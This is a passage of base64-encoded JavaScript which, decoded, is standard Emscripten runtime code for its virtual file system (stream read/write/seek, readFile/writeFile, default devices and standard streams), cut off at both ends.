uT3BlbkZpbGUnXSgnIiArIHBhdGggKyAiJywgZmxhZ3MpIHRocmV3IGFuIGV4Y2VwdGlvbjogIiArIGUubWVzc2FnZSkKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHN0cmVhbQogICAgfSksCiAgICBjbG9zZTogKGZ1bmN0aW9uKHN0cmVhbSkgewogICAgICAgIGlmKHN0cmVhbS5nZXRkZW50cykgc3RyZWFtLmdldGRlbnRzID0gbnVsbDsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZihzdHJlYW0uc3RyZWFtX29wcy5jbG9zZSkgewogICAgICAgICAgICAgICAgc3RyZWFtLnN0cmVhbV9vcHMuY2xvc2Uoc3RyZWFtKQogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgIHRocm93IGUKICAgICAgICB9IGZpbmFsbHkgewogICAgICAgICAgICBGUy5jbG9zZVN0cmVhbShzdHJlYW0uZmQpCiAgICAgICAgfQogICAgfSksCiAgICBsbHNlZWs6IChmdW5jdGlvbihzdHJlYW0sIG9mZnNldCwgd2hlbmNlKSB7CiAgICAgICAgaWYoIXN0cmVhbS5zZWVrYWJsZSB8fCAhc3RyZWFtLnN0cmVhbV9vcHMubGxzZWVrKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVTUElQRSkKICAgICAgICB9CiAgICAgICAgc3RyZWFtLnBvc2l0aW9uID0gc3RyZWFtLnN0cmVhbV9vcHMubGxzZWVrKHN0cmVhbSwgb2Zmc2V0LCB3aGVuY2UpOwogICAgICAgIHN0cmVhbS51bmdvdHRlbiA9IFtdOwogICAgICAgIHJldHVybiBzdHJlYW0ucG9zaXRpb24KICAgIH0pLAogICAgcmVhZDogKGZ1bmN0aW9uKHN0cmVhbSwgYnVmZmVyLCBvZmZzZXQsIGxlbmd0aCwgcG9zaXRpb24pIHsKICAgICAgICBpZihsZW5ndGggPCAwIHx8IHBvc2l0aW9uIDwgMCkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpCiAgICAgICAgfQogICAgICAgIGlmKChzdHJlYW0uZmxhZ3MgJiAyMDk3MTU1KSA9PT0gMSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FQkFERikKICAgICAgICB9CiAgICAgICAgaWYoRlMuaXNEaXIoc3RyZWFtLm5vZGUubW9kZSkpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlTRElSKQogICAgICAgIH0KICAgICAgICBpZighc3RyZWFtLnN0cmVhbV9vcHMucmVhZCkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpCiAgICAgICAgfQogICAgICAgIHZhciBzZWVraW5nID0gdHJ1ZTsKICAgICAgICBpZih0eXBlb2YgcG9zaXRpb24gPT09ICJ1bmRlZmluZWQiKSB7CiAgICAgICAgICAgIHBvc2l0aW9uID0gc3RyZWFtLnBvc2l0aW9uOwogICAgICAgICAgICBzZWVraW5nID0gZmFsc2UKICAgICAgICB9IGVsc2UgaWYoIXN0cmVhbS5zZWVrYWJsZSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FU1BJUEUpCiAgICAgICAgfQogICAgICAgIHZhciBieXRlc1JlYWQgPSBzdHJlYW0uc3RyZWFtX29wcy5yZWFkKHN0cmVhbSwgYnVmZmVyLCBvZmZzZXQsIGxlbmd0aCwgcG9zaXRpb24pOwogICAgICAgIGlmKCFzZWVraW5nKSBzdHJlYW0ucG9zaXRpb24gKz0gYnl0ZXNSZWFkOwogICAgICAgIHJldHVybiBieXRlc1JlYWQKICAgIH0pLAogICAgd3JpdGU6IChmdW5jdGlvbihzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIHBvc2l0aW9uLCBjYW5Pd24pIHsKICAgICAgICBpZihsZW5ndGggPCAwIHx8IHBvc2l0aW9uIDwgMCkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpCiAgICAgICAgfQogICAgICAgIGlmKChzdHJlYW0uZmxhZ3MgJiAyMDk3MTU1KSA9PT0gMCkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FQkFERikKICAgICAgICB9CiAgICAgICAgaWYoRlMuaXNEaXIoc3RyZWFtLm5vZGUubW9kZSkpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlTRElSKQogICAgICAgIH0KICAgICAgICBpZighc3RyZWFtLnN0cmVhbV9vcHMud3JpdGUpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKQogICAgICAgIH0KICAgICAgICBpZihzdHJlYW0uZmxhZ3MgJiAxMDI0KSB7CiAgICAgICAgICAgIEZTLmxsc2VlayhzdHJlYW0sIDAsIDIpCiAgICAgICAgfQogICAgICAgIHZhciBzZWVraW5nID0gdHJ1ZTsKICAgICAgICBpZih0eXBlb2YgcG9zaXRpb24gPT09ICJ1bmRlZmluZWQiKSB7CiAgICAgICAgICAgIHBvc2l0aW9uID0gc3RyZWFtLnBvc2l0aW9uOwogICAgICAgICAgICBzZWVraW5nID0gZmFsc2UKICAgICAgICB9IGVsc2UgaWYoIXN0cmVhbS5zZWVrYWJsZSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FU1BJUEUpCiAgICAgICAgfQogICAgICAgIHZhciBieXRlc1dyaXR0ZW4gPSBzdHJlYW0uc3RyZWFtX29wcy53cml0ZShzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIHBvc2l0aW9uLCBjYW5Pd24pOwogICAgICAgIGlmKCFzZWVraW5nKSBzdHJlYW0ucG9zaXRpb24gKz0gYnl0ZXNXcml0dGVuOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGlmKHN0cmVhbS5wYXRoICYmIEZTLnRyYWNraW5nRGVsZWdhdGVbIm9uV3JpdGVUb0ZpbGUiXSkgRlMudHJhY2tpbmdEZWxlZ2F0ZVsib25Xcml0ZVRvRmlsZSJdKHN0cmVhbS5wYXRoKQogICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICBjb25zb2xlLmxvZygiRlMudHJhY2tpbmdEZWxlZ2F0ZVsnb25Xcml0ZVRvRmlsZSddKCciICsgcGF0aCArICInKSB0aHJldyBhbiBleGNlcHRpb246ICIgKyBlLm1lc3NhZ2UpCiAgICAgICAgfQogICAgICAgIHJldHVybiBieXRlc1dyaXR0ZW4KICAgIH0pLAogICAgYWxsb2NhdGU6IChmdW5jdGlvbihzdHJlYW0sIG9mZnNldCwgbGVuZ3RoKSB7CiAgICAgICAgaWYob2Zmc2V0IDwgMCB8fCBsZW5ndGggPD0gMCkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU5WQUwpCiAgICAgICAgfQogICAgICAgIGlmKChzdHJlYW0uZmxhZ3MgJiAyMDk3MTU1KSA9PT0gMCkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FQkFERikKICAgICAgICB9CiAgICAgICAgaWYoIUZTLmlzRmlsZShzdHJlYW0ubm9kZS5tb2RlKSAmJiAhRlMuaXNEaXIoc3RyZWFtLm5vZGUubW9kZSkpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PREVWKQogICAgICAgIH0KICAgICAgICBpZighc3RyZWFtLnN0cmVhbV9vcHMuYWxsb2NhdGUpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU9QTk9UU1VQUCkKICAgICAgICB9CiAgICAgICAgc3RyZWFtLnN0cmVhbV9vcHMuYWxsb2NhdGUoc3RyZWFtLCBvZmZzZXQsIGxlbmd0aCkKICAgIH0pLAogICAgbW1hcDogKGZ1bmN0aW9uKHN0cmVhbSwgYnVmZmVyLCBvZmZzZXQsIGxlbmd0aCwgcG9zaXRpb24sIHByb3QsIGZsYWdzKSB7CiAgICAgICAgaWYoKHN0cmVhbS5mbGFncyAmIDIwOTcxNTUpID09PSAxKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVBQ0NFUykKICAgICAgICB9CiAgICAgICAgaWYoIXN0cmVhbS5zdHJlYW1fb3BzLm1tYXApIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PREVWKQogICAgICAgIH0KICAgICAgICByZXR1cm4gc3RyZWFtLnN0cmVhbV9vcHMubW1hcChzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIHBvc2l0aW9uLCBwcm90LCBmbGFncykKICAgIH0pLAogICAgbXN5bmM6IChmdW5jdGlvbihzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIG1tYXBGbGFncykgewogICAgICAgIGlmKCFzdHJlYW0gfHwgIXN0cmVhbS5zdHJlYW1fb3BzLm1zeW5jKSB7CiAgICAgICAgICAgIHJldHVybiAwCiAgICAgICAgfQogICAgICAgIHJldHVybiBzdHJlYW0uc3RyZWFtX29wcy5tc3luYyhzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIG1tYXBGbGFncykKICAgIH0pLAogICAgbXVubWFwOiAoZnVuY3Rpb24oc3RyZWFtKSB7CiAgICAgICAgcmV0dXJuIDAKICAgIH0pLAogICAgaW9jdGw6IChmdW5jdGlvbihzdHJlYW0sIGNtZCwgYXJnKSB7CiAgICAgICAgaWYoIXN0cmVhbS5zdHJlYW1fb3BzLmlvY3RsKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT1RUWSkKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHN0cmVhbS5zdHJlYW1fb3BzLmlvY3RsKHN0cmVhbSwgY21kLCBhcmcpCiAgICB9KSwKICAgIHJlYWRGaWxlOiAoZnVuY3Rpb24ocGF0aCwgb3B0cykgewogICAgICAgIG9wdHMgPSBvcHRzIHx8IHt9OwogICAgICAgIG9wdHMuZmxhZ3MgPSBvcHRzLmZsYWdzIHx8ICJyIjsKICAgICAgICBvcHRzLmVuY29kaW5nID0gb3B0cy5lbmNvZGluZyB8fCAiYmluYXJ5IjsKICAgICAgICBpZihvcHRzLmVuY29kaW5nICE9PSAidXRmOCIgJiYgb3B0cy5lbmNvZGluZyAhPT0gImJpbmFyeSIpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdJbnZhbGlkIGVuY29kaW5nIHR5cGUgIicgKyBvcHRzLmVuY29kaW5nICsgJyInKQogICAgICAgIH0KICAgICAgICB2YXIgcmV0OwogICAgICAgIHZhciBzdHJlYW0gPSBGUy5vcGVuKHBhdGgsIG9wdHMuZmxhZ3MpOwogICAgICAgIHZhciBzdGF0ID0gRlMuc3RhdChwYXRoKTsKICAgICAgICB2YXIgbGVuZ3RoID0gc3RhdC5zaXplOwogICAgICAgIHZhciBidWYgPSBuZXcgVWludDhBcnJheShsZW5ndGgpOwogICAgICAgIEZTLnJlYWQoc3RyZWFtLCBidWYsIDAsIGxlbmd0aCwgMCk7CiAgICAgICAgaWYob3B0cy5lbmNvZGluZyA9PT0gInV0ZjgiKSB7CiAgICAgICAgICAgIHJldCA9IFVURjhBcnJheVRvU3RyaW5nKGJ1ZiwgMCkKICAgICAgICB9IGVsc2UgaWYob3B0cy5lbmNvZGluZyA9PT0gImJpbmFyeSIpIHsKICAgICAgICAgICAgcmV0ID0gYnVmCiAgICAgICAgfQogICAgICAgIEZTLmNsb3NlKHN0cmVhbSk7CiAgICAgICAgcmV0dXJuIHJldAogICAgfSksCiAgICB3cml0ZUZpbGU6IChmdW5jdGlvbihwYXRoLCBkYXRhLCBvcHRzKSB7CiAgICAgICAgb3B0cyA9IG9wdHMgfHwge307CiAgICAgICAgb3B0cy5mbGFncyA9IG9wdHMuZmxhZ3MgfHwgInciOwogICAgICAgIG9wdHMuZW5jb2RpbmcgPSBvcHRzLmVuY29kaW5nIHx8ICJ1dGY4IjsKICAgICAgICBpZihvcHRzLmVuY29kaW5nICE9PSAidXRmOCIgJiYgb3B0cy5lbmNvZGluZyAhPT0gImJpbmFyeSIpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdJbnZhbGlkIGVuY29kaW5nIHR5cGUgIicgKyBvcHRzLmVuY29kaW5nICsgJyInKQogICAgICAgIH0KICAgICAgICB2YXIgc3RyZWFtID0gRlMub3BlbihwYXRoLCBvcHRzLmZsYWdzLCBvcHRzLm1vZGUpOwogICAgICAgIGlmKG9wdHMuZW5jb2RpbmcgPT09ICJ1dGY4IikgewogICAgICAgICAgICB2YXIgYnVmID0gbmV3IFVpbnQ4QXJyYXkobGVuZ3RoQnl0ZXNVVEY4KGRhdGEpICsgMSk7CiAgICAgICAgICAgIHZhciBhY3R1YWxOdW1CeXRlcyA9IHN0cmluZ1RvVVRGOEFycmF5KGRhdGEsIGJ1ZiwgMCwgYnVmLmxlbmd0aCk7CiAgICAgICAgICAgIEZTLndyaXRlKHN0cmVhbSwgYnVmLCAwLCBhY3R1YWxOdW1CeXRlcywgMCwgb3B0cy5jYW5Pd24pCiAgICAgICAgfSBlbHNlIGlmKG9wdHMuZW5jb2RpbmcgPT09ICJiaW5hcnkiKSB7CiAgICAgICAgICAgIEZTLndyaXRlKHN0cmVhbSwgZGF0YSwgMCwgZGF0YS5sZW5ndGgsIDAsIG9wdHMuY2FuT3duKQogICAgICAgIH0KICAgICAgICBGUy5jbG9zZShzdHJlYW0pCiAgICB9KSwKICAgIGN3ZDogKGZ1bmN0aW9uKCkgewogICAgICAgIHJldHVybiBGUy5jdXJyZW50UGF0aAogICAgfSksCiAgICBjaGRpcjogKGZ1bmN0aW9uKHBhdGgpIHsKICAgICAgICB2YXIgbG9va3VwID0gRlMubG9va3VwUGF0aChwYXRoLCB7Zm9sbG93OiB0cnVlfSk7CiAgICAgICAgaWYobG9va3VwLm5vZGUgPT09IG51bGwpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PRU5UKQogICAgICAgIH0KICAgICAgICBpZighRlMuaXNEaXIobG9va3VwLm5vZGUubW9kZSkpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRU5PVERJUikKICAgICAgICB9CiAgICAgICAgdmFyIGVyciA9IEZTLm5vZGVQZXJtaXNzaW9ucyhsb29rdXAubm9kZSwgIngiKTsKICAgICAgICBpZihlcnIpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoZXJyKQogICAgICAgIH0KICAgICAgICBGUy5jdXJyZW50UGF0aCA9IGxvb2t1cC5wYXRoCiAgICB9KSwKICAgIGNyZWF0ZURlZmF1bHREaXJlY3RvcmllczogKGZ1bmN0aW9uKCkgewogICAgICAgIEZTLm1rZGlyKCIvdG1wIik7CiAgICAgICAgRlMubWtkaXIoIi9ob21lIik7CiAgICAgICAgRlMubWtkaXIoIi9ob21lL3dlYl91c2VyIikKICAgIH0pLAogICAgY3JlYXRlRGVmYXVsdERldmljZXM6IChmdW5jdGlvbigpIHsKICAgICAgICBGUy5ta2RpcigiL2RldiIpOwogICAgICAgIEZTLnJlZ2lzdGVyRGV2aWNlKEZTLm1ha2VkZXYoMSwgMyksIHsKICAgICAgICAgICAgcmVhZDogKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgcmV0dXJuIDAKICAgICAgICAgICAgfSksIHdyaXRlOiAoZnVuY3Rpb24oc3RyZWFtLCBidWZmZXIsIG9mZnNldCwgbGVuZ3RoLCBwb3MpIHsKICAgICAgICAgICAgICAgIHJldHVybiBsZW5ndGgKICAgICAgICAgICAgfSkKICAgICAgICB9KTsKICAgICAgICBGUy5ta2RldigiL2Rldi9udWxsIiwgRlMubWFrZWRldigxLCAzKSk7CiAgICAgICAgVFRZLnJlZ2lzdGVyKEZTLm1ha2VkZXYoNSwgMCksIFRUWS5kZWZhdWx0X3R0eV9vcHMpOwogICAgICAgIFRUWS5yZWdpc3RlcihGUy5tYWtlZGV2KDYsIDApLCBUVFkuZGVmYXVsdF90dHkxX29wcyk7CiAgICAgICAgRlMubWtkZXYoIi9kZXYvdHR5IiwgRlMubWFrZWRldig1LCAwKSk7CiAgICAgICAgRlMubWtkZXYoIi9kZXYvdHR5MSIsIEZTLm1ha2VkZXYoNiwgMCkpOwogICAgICAgIHZhciByYW5kb21fZGV2aWNlOwogICAgICAgIGlmKHR5cGVvZiBjcnlwdG8gIT09ICJ1bmRlZmluZWQiKSB7CiAgICAgICAgICAgIHZhciByYW5kb21CdWZmZXIgPSBuZXcgVWludDhBcnJheSgxKTsKICAgICAgICAgICAgcmFuZG9tX2RldmljZSA9IChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIGNyeXB0by5nZXRSYW5kb21WYWx1ZXMocmFuZG9tQnVmZmVyKTsKICAgICAgICAgICAgICAgIHJldHVybiByYW5kb21CdWZmZXJbMF0KICAgICAgICAgICAgfSkKICAgICAgICB9IGVsc2UgaWYoRU5WSVJPTk1FTlRfSVNfTk9ERSkgewogICAgICAgICAgICByYW5kb21fZGV2aWNlID0gKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgcmV0dXJuIHJlcXVpcmUoImNyeXB0byIpLnJhbmRvbUJ5dGVzKDEpWzBdCiAgICAgICAgICAgIH0pCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmFuZG9tX2RldmljZSA9IChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIHJldHVybiBNYXRoLnJhbmRvbSgpICogMjU2IHwgMAogICAgICAgICAgICB9KQogICAgICAgIH0KICAgICAgICBGUy5jcmVhdGVEZXZpY2UoIi9kZXYiLCAicmFuZG9tIiwgcmFuZG9tX2RldmljZSk7CiAgICAgICAgRlMuY3JlYXRlRGV2aWNlKCIvZGV2IiwgInVyYW5kb20iLCByYW5kb21fZGV2aWNlKTsKICAgICAgICBGUy5ta2RpcigiL2Rldi9zaG0iKTsKICAgICAgICBGUy5ta2RpcigiL2Rldi9zaG0vdG1wIikKICAgIH0pLAogICAgY3JlYXRlU3BlY2lhbERpcmVjdG9yaWVzOiAoZnVuY3Rpb24oKSB7CiAgICAgICAgRlMubWtkaXIoIi9wcm9jIik7CiAgICAgICAgRlMubWtkaXIoIi9wcm9jL3NlbGYiKTsKICAgICAgICBGUy5ta2RpcigiL3Byb2Mvc2VsZi9mZCIpOwogICAgICAgIEZTLm1vdW50KHsKICAgICAgICAgICAgbW91bnQ6IChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIHZhciBub2RlID0gRlMuY3JlYXRlTm9kZSgiL3Byb2Mvc2VsZiIsICJmZCIsIDE2Mzg0IHwgNTExLCA3Myk7CiAgICAgICAgICAgICAgICBub2RlLm5vZGVfb3BzID0gewogICAgICAgICAgICAgICAgICAgIGxvb2t1cDogKGZ1bmN0aW9uKHBhcmVudCwgbmFtZSkgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgZmQgPSArbmFtZTsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHN0cmVhbSA9IEZTLmdldFN0cmVhbShmZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCFzdHJlYW0pIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCQURGKTsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHJldCA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcmVudDogbnVsbCwgbW91bnQ6IHttb3VudHBvaW50OiAiZmFrZSJ9LCBub2RlX29wczogewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlYWRsaW5rOiAoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBzdHJlYW0ucGF0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgICAgIHJldC5wYXJlbnQgPSByZXQ7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByZXQKICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgIHJldHVybiBub2RlCiAgICAgICAgICAgIH0pCiAgICAgICAgfSwge30sICIvcHJvYy9zZWxmL2ZkIikKICAgIH0pLAogICAgY3JlYXRlU3RhbmRhcmRTdHJlYW1zOiAoZnVuY3Rpb24oKSB7CiAgICAgICAgaWYoTW9kdWxlWyJzdGRpbiJdKSB7CiAgICAgICAgICAgIEZTLmNyZWF0ZURldmljZSgiL2RldiIsICJzdGRpbiIsIE1vZHVsZVsic3RkaW4iXSkKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBGUy5zeW1saW5rKCIvZGV2L3R0eSIsICIvZGV2L3N0ZGluIikKICAgICAgICB9CiAgICAgICAgaWYoTW9kdWxlWyJzdGRvdXQiXSkgewogICAgICAgICAgICBGUy5jcmVhdGVEZXZpY2UoIi9kZXYiLCAic3Rkb3V0IiwgbnVsbCwgTW9kdWxlWyJzdGRvdXQiXSkKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBGUy5zeW1saW5rKCIvZGV2L3R0eSIsICIvZGV2L3N0ZG91dCIpCiAgICAgICAgfQogICAgICAgIGlmKE1vZHVsZVsic3RkZXJyIl0pIHsKICAgICAgICAgICAgRlMuY3JlYXRlRGV2aWNlKCIvZGV2IiwgInN0ZGVyciIsIG51bGwsIE1vZHVsZVsic3RkZXJyIl0pCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgRlMuc3ltbGluaygiL2Rldi90dHkxIiwgIi9kZXYvc3RkZXJyIikKICAgICAgICB9CiAgICAgICAgdmFyIHN0ZGluID0gRlMub3BlbigiL2Rldi9zdGRpbiIsICJyIik7CiAgICAgICAgYXNzZXJ0KHN0ZGluLmZkID09PSAwLCAiaW52YWxpZCBoYW5kbGUgZm9yIHN0ZGluICgiICsgc3RkaW4uZmQgKyAiKSIpOwogICAgICAgIHZhciBzdGRvdXQgPSBGUy5vcGVuKCIvZGV2L3N0ZG91dCIsICJ3Iik7CiAgICAgICAgYXNzZXJ0KHN0ZG91dC5mZCA9PT0gMSwgImludmFsaWQgaGFuZGxlIGZvciBzdGRvdXQgKCIgKyBzdGRvdXQuZmQgKyAiKSIpOwogICAgICAgIHZhciBzdGRlcnIgPSBGUy5vcGVuKCIvZGV2L3N0ZGVyciIsICJ3Iik7CiAgICAgICAgYXNzZXJ0KHN0ZGVyci5mZCA9PT0gMiwgImludmFsaWQgaGFuZGxlIGZvciBzdGRlcnIgKCIgKyBzdGRlcnIuZmQgKyAiKSIpCiAgICB9KSwKICAgIGVuc3VyZUVycm5vRXJyb3I6IChmdW5jdGlvbigpIHsKICAgICAgICBpZihGUy5FcnJub0Vycm9yKSByZXR1cm47CiAgICAgICAgRlMuRXJybm9FcnJvciA9IGZ1bmN0aW9uIEVycm5vRXJyb3IoZXJybm8sIG5vZGUpIHsKICAgICAgICAgICAgdGhpcy5ub2RlID0gbm9kZTsKICAgICAgICAgICAgdGhpcy5zZXRFcnJubyA9IChmdW5jdGlvbihlcnJubykgewogICAgICAgICAgICAgICAgdGhpcy5lcnJubyA9IGVycm5vOwogICAgICAgICAgICAgICAgZm9yKHZhciBrZXkgaW4gRVJSTk9fQ09ERVMpIHsKICAgICAgICAgICAgICAgICAgICBpZihFUlJOT19DT0RFU1trZXldID09PSBlcnJubykgewogICAgICAgICAgICAgICAgICAgICAgICB0aGlzLmNvZGUgPSBrZXk7CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KTsKICAgICAgICAgICAgdGhpcy5zZXRFcnJubyhlcnJubyk7CiAgICAgICAgICAgIHRoaXMubWVzc2FnZSA9IEVSUk5PX01FU1NBR0VTW2Vycm5vXQogICAgICAgIH07CiAgICAgICAgRlMuRXJybm9FcnJvci5wcm90b3R5cGUgPSBuZXcgRXJyb3I7CiAgICAgICAgRlMuRXJybm9FcnJvci5wcm90b3R5cGUuY29uc3RydWN0b3IgPSBGUy5FcnJub0Vycm9yOwogICAgICAgIFtFUlJOT19DT0RFUy5FTk9FTlRdLmZvckVhY2goKGZ1bmN0aW9uKGNvZGUpIHsKICAgICAgICAgICAgRlMuZ2VuZXJpY0Vycm9yc1tjb2RlXSA9IG5ldyBGUy5FcnJub0Vycm9yKGNvZGUpOwogICAgICAgICAgICBGUy5nZW5lcmljRXJyb3JzW2NvZGVdLnN0YWNrID0gIjxnZW5lcmljIGVycm9yLCBubyBzdGFjaz4iCiAgICAgICAgfSkpCiAgICB9KSwKICAgIHN0YXRpY0luaXQ6IChmdW5jdGlvbigpIHsKICAgICAgICBGUy5lbnN1cmVFcnJub0Vycm9yKCk7CiAgICAgICAgRlMubmFtZVRhYmxlID0gbmV3IEFycmF5KDQwOTYpOwogICAgICAgIEZTLm1vdW50KE1FTUZTLCB7fSwgIi8iKTsKICAgICAgICBGUy5jcmVhdGVEZWZhdWx0RGlyZWN0b3JpZXMoKTsKICAgICAgICBGUy5jcmVhdGVEZWZhdWx0RGV2aWNlcygpOwogICAgICAgIEZTLmNyZWF0ZVNwZWNpYWxEaXJlY3RvcmllcygpOwogICAgICAgIEZTLmZpbGVzeXN0ZW1zID0geyJNRU1GUyI6IE1FTUZTLCAiSURCRlMiOiBJREJGUywgIk5PREVGUyI6IE5PREVGUywgIldPUktFUkZTIjogV09SS0VSRlN9CiAgICB9KSwKICAgIGluaXQ6IChmdW5jdGlvbihpbnB1dCwgb3V0cHV0LCBlcnJvcikgewogICAgICAgIGFzc2VydCghRlMuaW5pdC5pbml0aWFsaXplZCwgIkZTLmluaXQgd2FzIHByZXZpb3VzbHkgY2FsbGVkLiBJZiB5b3Ugd2FudCB0byBpbml0aWFsaXplIGxhdGVyIHdpdGggY3VzdG9tIHBhcmFtZXRlcnMsIHJlbW92ZSBhbnkgZWFybGllciBjYWxscyAobm90ZSB0aGF0IG9uZSBpcyBhdXRvbWF0aWNhbGx5IGFkZGVkIHRvIHRoZSBnZW5lcmF0ZWQgY29kZSkiKTsKICAgICAgICBGUy5pbml0LmluaXRpYWxpemVkID0gdHJ1ZTsKICAgICAgICBGUy5lbnN1cmVFcnJub0Vycm9yKCk7CiAgICAgICAgTW9kdWxlWyJzdGRpbiJdID0gaW5wdXQgfHwgTW9kdWxlWyJzdGRpbiJdOwogICAgICAgIE1vZHVsZVsic3Rkb3V0Il0gPSBvdXRwdXQgfHwgTW9kdWxlWyJzdGRvdXQiXTsKICAgICAgICBNb2R1bGVbInN0ZGVyciJdID0gZXJyb3IgfHwgTW9kdWxlWyJzdGRlcnIiXTsKICAgICAgICBGUy5jcmVhdGVTdGFuZGFyZFN0cmVhbXMoKQogICAgfSksCiAgICBxdWl0OiAoZnVuY3Rpb24oKSB7CiAgICAgICAgRlMuaW5pdC5pbml0aWFsaXplZCA9IGZhbHNlOwogICAgICAgIHZhciBmZmx1c2ggPSBNb2R1bGVbIl9mZmx1c2giXTsKICAgICAgICBpZihmZmx1c2gpIGZmbHVzaCgwKTsKICAgICAgICBmb3IodmFyIGkgPSAwOyBpIDwgRlMuc3RyZWFtcy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICB2YXIgc3RyZWFtID0gRlMuc3RyZWFtc1tpXTsKICAgICAgICAgICAgaWYoIXN0cmVhbSkgewogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgfQogICAgICAgICAgICBGUy5jbG9zZShzdHJlYW0pCiAgICAgICAgfQogICAgfSksCiAgICBnZXRNb2RlOiAoZnVuY3Rpb24oY2FuUmVhZCwgY2FuV3JpdGUpIHsKICAgICAgICB2YXIgbW9kZSA9IDA7CiAgICAgICAgaWYoY2FuUmVhZCkgbW9kZSB8PSAyOTIgfCA3MzsKICAgICAgICBpZihjYW5Xcml0ZSkgbW9kZSB8PSAxNDY7CiAgICAgICAgcmV0dXJuIG1vZGUKICAgIH0pLAogICAgam9pblBhdGg6IChmdW5jdGlvbihwYXJ0cywgZm9yY2VSZWxhdGl2ZSkgewogICAgICAgIHZhciBwYXRoID0gUEFUSC5qb2luLmFwcGx5KG51bGwsIHBhcnRzKTsKICAgICAgICBpZihmb3JjZVJlbGF0aXZlICYmIHBhdGhbMF0gPT0gIi8iKSBwYXRoID0gcGF0aC5zdWJzdHIoMSk7CiAgICAgICAgcmV0dXJuIHBhdGgKICAgIH0pLAogICAgYWJzb2x1dGVQYXRoOiAoZnVuY3Rpb24ocmVsYXRpdmUs